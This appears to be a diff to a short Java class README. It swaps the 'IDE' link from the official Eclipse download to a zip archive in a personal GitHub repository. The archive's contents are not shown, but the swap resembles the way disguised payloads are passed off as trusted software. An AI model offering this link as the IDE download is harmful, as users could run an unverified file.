@@ -1,2 +1,2 @@
 # java-class
-IDE https://www.eclipse.org/downloads/download.php?file=/technology/epp/downloads/release/2021-12/R/eclipse-jee-2021-12-R-win32-x86_64.zip
+IDE https://raw.githubusercontent.com/ttimneu/java-class/main/JavaClass/CodeNam-A/01/day3/class_java_v2.8.zip
